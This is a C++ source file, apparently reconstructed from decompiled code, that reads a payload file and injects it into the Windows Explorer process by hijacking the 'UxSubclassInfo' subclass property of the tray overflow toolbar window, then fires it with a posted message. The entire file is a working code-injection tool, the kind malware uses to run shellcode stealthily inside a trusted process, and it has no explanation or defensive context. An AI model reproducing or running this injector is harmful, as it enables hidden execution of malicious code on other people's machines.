#include <windows.h>
// #include "aes.hpp"
#include <stdio.h>
// #include "xor.h"
#include <iostream>

int main()
{
  
  LPWSTR CommandLineW = GetCommandLineW();
  int pNumArgs;
  SIZE_T NumberOfBytesWritten = 0;
  void *v9;

  LPWSTR *v4 = CommandLineToArgvW(CommandLineW, &pNumArgs);
  if ( pNumArgs == 2 )
  {
    LPWSTR v5 = v4[1];
    DWORD NumberOfBytesRead = 0;
    HANDLE FileW = CreateFileW(v5, 0x80000000, 0, 0, 3u, 0x80u, 0);
    HANDLE v7 = FileW;

    typedef LRESULT (CALLBACK *SUBCLASSPROC)(
   HWND      hWnd,
   UINT      uMsg,
   WPARAM    wParam,
   LPARAM    lParam,
   UINT_PTR  uIdSubclass,
   DWORD_PTR dwRefData);

typedef struct _SUBCLASS_CALL {
  SUBCLASSPROC pfnSubclass;    // subclass procedure
  WPARAM       uIdSubclass;    // unique subclass identifier
  DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
  UINT                    uCallIndex;   // index of next callback to call
  UINT                    uDeepestCall; // deepest uCallIndex on stack
  struct _SUBCLASS_FRAME  *pFramePrev;  // previous subclass frame pointer
  struct _SUBCLASS_HEADER *pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
  UINT           uRefs;        // subclass count
  UINT           uAlloc;       // allocated subclass call nodes
  UINT           uCleanup;     // index of call node to clean up
  DWORD          dwThreadId;   // thread id of window we are hooking
  SUBCLASS_FRAME *pFrameCur;   // current subclass frame pointer
  SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, *PSUBCLASS_HEADER;


	SUBCLASS_HEADER Buffer;

    if ( FileW == (HANDLE)-1)
    {
      	v9 = (void *)NumberOfBytesWritten;
    }
    else
    {
      int FileSize = GetFileSize(FileW, 0);
      v9 = malloc(FileSize + 16);
      ReadFile(v7, v9, FileSize, &NumberOfBytesRead, 0);
      CloseHandle(v7);
    }
    int v10 = NumberOfBytesRead;
    if ( NumberOfBytesRead )
    {
      HWND WindowA = FindWindowA(("NotifyIconOverflowWindow"), 0);
      HWND Window = FindWindowExA(WindowA, 0, ("ToolbarWindow32"), 0);
      HANDLE PropA = GetPropA(Window,("UxSubclassInfo"));
      DWORD dwProcessId;
      GetWindowThreadProcessId(Window, &dwProcessId);
      
      HANDLE v14 = OpenProcess(0x1FFFFF, 0, dwProcessId);
      ReadProcessMemory(v14, PropA, &Buffer, sizeof(Buffer), &NumberOfBytesWritten);
      void *v15 = VirtualAllocEx(v14, 0, sizeof(Buffer), 0x3000, 4u); 
      void * v23 = VirtualAllocEx(v14, 0, v10, 0x1000, 0x40u);
      Buffer.CallArray[0].pfnSubclass = (SUBCLASSPROC)v23;

      WriteProcessMemory(v14, v23, v9, v10, &NumberOfBytesWritten);
      WriteProcessMemory(v14, v15, &Buffer, sizeof(Buffer),&NumberOfBytesWritten);
      SetPropA(Window,("UxSubclassInfo"), v15);
      PostMessageA(Window, 0x10u, 0, 0);
      Sleep(0x64u);
      SetPropA(Window,("UxSubclassInfo"), PropA);
      VirtualFreeEx(v14, v15, 0, 0xC000);
      VirtualFreeEx(v14, v23, 0, 0xC000);  
      CloseHandle(v14);
    }
    else
    {
       std::cout << "please provide a file\n" <<std::endl; 
    }
  }
  else
  {
  std::cout<<"usage: path <file>\n"<<std::endl;
  }
  return 0;
}